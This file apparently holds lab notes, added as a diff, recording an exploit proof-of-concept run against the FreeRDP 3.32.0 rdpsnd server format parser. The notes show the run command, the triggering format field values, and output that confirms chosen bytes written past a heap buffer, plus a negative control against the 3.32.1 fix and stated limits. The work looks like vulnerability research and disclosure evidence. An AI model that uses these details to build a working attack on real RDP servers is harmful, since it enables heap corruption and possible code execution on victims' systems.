@@ -1,0 +1,46 @@
+Chosen-byte rung 4 on real FreeRDP 3.32.0 bytes, through the real
+rdpsnd_server_recv_formats() SNDC_FORMATS parser. Wake 4, 2026-11-20 23:01Z.
+
+Command (from repo root):
+  bash lab/freerdp2shell-src/run.sh
+-> ALL REAL-LIBRARY CHECKS PASS, rc 0
+
+The PoC is compiled WITHOUT sanitizers: ASan aborts on the first OOB write and
+cannot observe the second SendSamples call. Its source is
+PocRdpsndChosenBytes.c; it includes the real 3.32.0 rdpsnd_main.c into its own
+translation unit, so the parser, select_format and send_samples are all real
+source compiled here. Both libraries and the PoC use the same scratch source
+tree; the plain build is /tmp/fr-wake2/build3320_plain.
+
+Observed (timestamped log line normalized to [TIME]):
+
+recv_formats rc=0 nformats=2
+parsed[1]: tag=17 channels=2 blockalign=4 cbsize=2
+[TIME] [ERROR][com.freerdp.channels.rdpsnd.server] - [rdpsnd_server_select_format]: realloc failed!
+SelectFormat rc=12 out_frames=0xfffffffffffffff0 out_buffer_size=8820
+readback offset 8819  = 11 (want 11, last in-bounds byte)
+readback offset 8820  = de (want de, client marker, call 1)
+readback offset 8821  = 11 (want 11, call 1)
+readback offset 16384 = 22 (want 22, call 2 start)
+readback offset 21384 = ad (want ad, client marker, call 2)
+out_pending_frames=8192 out_frames=0xfffffffffffffff0 (never reached)
+[rung4] RESULT=PASS
+
+The process exits 0 via _exit() after flushing: normal teardown frees the
+deliberately corrupted heap and faults. This is not an ASan result; the ASan
+heap-buffer-overflow on the same source is in vuln_real_library_asan.txt and
+wire_parse_asan.txt.
+
+Fixed-source negative control (23:02Z): the same PoC compiled against a copy
+of rdpsnd_main.c with the 3.32.1 division guard
+  if (format->nBlockAlign / 4ull < format->nChannels) goto out;
+inserted before the DVI_ADPCM case exits rc 3 with
+  SelectFormat rc=0 out_frames=0x000000000000089d out_buffer_size=8820
+i.e. no wrap, no two-call write, no chosen-byte readback. The guard is the
+discriminator.
+
+Conditions and limits: in-process injection of a crafted PDU into the real
+parser. No virtual-channel transport, RDP session, auth gate, live server,
+network reachability or stock allocator grooming. Default posture is
+post-auth (PR:L, CVSS 8.8); only no-auth deployments reach 9.8. Author
+evidence is not independent acceptance; witness replay is separate.
